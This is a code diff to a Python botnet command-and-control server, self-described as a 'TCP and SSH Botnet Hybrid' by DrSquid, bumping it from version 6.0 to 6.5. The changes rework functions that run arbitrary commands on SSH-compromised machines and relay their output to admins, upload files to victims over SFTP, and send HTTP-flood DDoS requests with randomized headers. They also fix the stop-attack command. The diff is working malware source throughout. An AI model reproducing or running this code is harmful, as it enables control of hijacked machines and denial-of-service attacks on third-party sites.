@@ -5,7 +5,11 @@ try:
 except:
     pass
 from optparse import OptionParser
-
+"""This script is NOT Perfected(Still a WIP)! Notify me if there are any 
+issues with the script! I am open for DMs but please state that are a user
+of my scripts, otherwise I will ignore you(I don't accept DMs from
+strangers). My Discord: DrSquid™#7711. If you are unable to reach me,
+you can open a discussion and I will respond to that in my repository."""
 class ArguementParse:
     """Main Class for parsing command prompt arguements
     when running the scripts."""
@@ -169,7 +173,7 @@ class Botnet:
             self.log(
                 "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "6.0"
+        self.version = "6.5"
         self.conn_list = []
         self.admin_conn = []
         self.ips = []
@@ -259,14 +263,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _             __   _____ 
- / ____|           (_)   | | \ | |    | |           / /  | ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_  | |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ |___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)____/ 
-           | |                                                  
-           |_|                                                                                                                        
+  _____             _     _ _   _      _             __  ___  
+ / ____|           (_)   | | \ | |    | |           / / / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_| (_) |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ __, |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | / / 
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)_/  
+           | |                                                
+           |_|                                                                                                                                                     
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -698,55 +702,64 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
     def send_ssh(self, instruction):
         """Sends instructions to the SSH-Bots. The output will also be sent
         back to the Server for the admins to see."""
-        for bot in self.ssh_bots:
-            for usernames in self.ssh_botlist:
-                if str(bot) in usernames:
-                    split_item = usernames.split()
-                    username = split_item[4]
-            stdin, stdout, stderr = bot.exec_command(instruction, get_pty=True)
-            stdin.close()
-            output = stdout.read().decode()
-            if output.strip() == "":
-                pass
-            else:
-                msgtoclient = f"\n[({username})]: {output.strip()}"
-                self.log(msgtoclient)
-                print(msgtoclient)
-                for admin in self.admin_conn:
-                    try:
-                        admin.send(msgtoclient.encode())
-                    except:
-                        self.log(f"[(ERROR)]: Unable to send message to {admin}.")
+        try:
+            for bot in self.ssh_bots:
+                for usernames in self.ssh_botlist:
+                    if str(bot) in usernames:
+                        split_item = usernames.split()
+                        username = split_item[4]
+                try:
+                    stdin, stdout, stderr = bot.exec_command(instruction, get_pty=True)
+                    stdin.close()
+                    output = stdout.read().decode()
+                    if output.strip() == "":
+                        pass
+                    else:
+                        msgtoclient = f"\n[({username})]: {output.strip()}"
+                        self.log(msgtoclient)
+                        print(msgtoclient)
+                        for admin in self.admin_conn:
+                            try:
+                                admin.send(msgtoclient.encode())
+                            except:
+                                self.log(f"[(ERROR)]: Unable to send message to {admin}.")
+                except:
+                    bot.close()
+        except:
+            pass
     def ssh_inject(self, client, file):
         """This function Opens up SFTP(Secure File Transfer Protocol) and sends a file
         to the SSH-Bots, where they can be opened up on command."""
-        if "/" in file or "\\" in file:
-            result = ""
-            for letter in file:
-                if letter == "/" or letter == "\\":
-                    result += " "
-                else:
-                    result += letter
-            split_result = result.split()
-            file = split_result[(len(split_result) - 1)]
-            file_dir = ""
-            for item in split_result:
-                if item == file:
-                    pass
-                else:
-                    file_dir = file_dir + item + "/"
-            os.chdir(file_dir)
-        for usernames in self.ssh_botlist:
-            if str(client) in usernames:
-                split_item = usernames.split()
-                username = split_item[4]
         try:
-            sftp = client.open_sftp()
-            sftp.put(file, f'C:/{username}/{file}')
+            if "/" in file or "\\" in file:
+                result = ""
+                for letter in file:
+                    if letter == "/" or letter == "\\":
+                        result += " "
+                    else:
+                        result += letter
+                split_result = result.split()
+                file = split_result[(len(split_result) - 1)]
+                file_dir = ""
+                for item in split_result:
+                    if item == file:
+                        pass
+                    else:
+                        file_dir = file_dir + item + "/"
+                os.chdir(file_dir)
+            for usernames in self.ssh_botlist:
+                if str(client) in usernames:
+                    split_item = usernames.split()
+                    username = split_item[4]
+            try:
+                sftp = client.open_sftp()
+                sftp.put(file, f'C:/{username}/{file}')
+            except:
+                sftp = client.open_sftp()
+                sftp.put(file, f'/Users/{username}/{file}')
+            os.chdir(self.cwd)
         except:
-            sftp = client.open_sftp()
-            sftp.put(file, f'/Users/{username}/{file}')
-        os.chdir(self.cwd)
+            pass
     def instruct(self):
         """Server-Side Sending intructions to the bots. This is so that the Server
         can also send packets to the Bots which they can send info back to the Server
@@ -858,6 +871,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Optimized the code.
 [+] - Fixed web-interface server slowing down Botnet.
 [+] - Fixed NotSamePassException Errors.
+[+] - Fixed Error in self.send_ssh that would flood output with errors.
+[+] - Fixed Error in Stopping DDoS Attacks(tried to call a bool object and not function).
                     """)
                 if self.instruction != "!clear":
                     if len(self.ssh_bots) != 0:
@@ -4216,33 +4231,35 @@ class DDoS:
             result += chr(item)
         return result
     def ddos(self):
-        try:
-            code = 0
-            agent = random.choice(self.useragents)
-            req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
-                                                      'Referer': random.choice(self.referers) + self.build_querystr(
-                                                          random.randint(50, 100)),
-                                                      'Cache-Control': 'no-cache',
-                                                      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-                                                      'Keep-Alive': random.randint(110, 160),
-                                                      'Connection': 'keep-alive'})
-            urllib.request.urlopen(req)
-            code = 200
-        except urllib.error.HTTPError as e:
-            code_split = str(e).split()
-            code = code_split[2]
-            code = str(code[0] + code[1] + code[2])
-            if "500" in str(e):
-                code = 500
-            elif "429" in str(e):
-                code = 500
-            elif code.startswith('5'):
-                code = 500
-        except urllib.error.URLError as e:
-            if "A connection attempt failed" in str(e):
-                code = 500
-        except:
-            pass
+        if not self.stopatk:
+            try:
+                code = 0
+                agent = random.choice(self.useragents)
+                req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
+                                                               'Referer': random.choice(
+                                                                   self.referers) + self.build_querystr(
+                                                                   random.randint(50, 100)),
+                                                               'Cache-Control': 'no-cache',
+                                                               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                                                               'Keep-Alive': random.randint(110, 160),
+                                                               'Connection': 'keep-alive'})
+                urllib.request.urlopen(req)
+                code = 200
+            except urllib.error.HTTPError as e:
+                code_split = str(e).split()
+                code = code_split[2]
+                code = str(code[0] + code[1] + code[2])
+                if "500" in str(e):
+                    code = 500
+                elif "429" in str(e):
+                    code = 500
+                elif code.startswith('5'):
+                    code = 500
+            except urllib.error.URLError as e:
+                if "A connection attempt failed" in str(e):
+                    code = 500
+            except:
+                pass
         return code
     def start_thr(self):
         while True:
@@ -4617,7 +4634,7 @@ OS:       {sys.platform}
                     self.dos = DDoS(ip, delay)
                 elif self.msg.startswith('!stopatk'):
                     try:
-                        self.dos.stopatk()
+                        self.dos.stop_atk()
                     except:
                         pass
                     try:
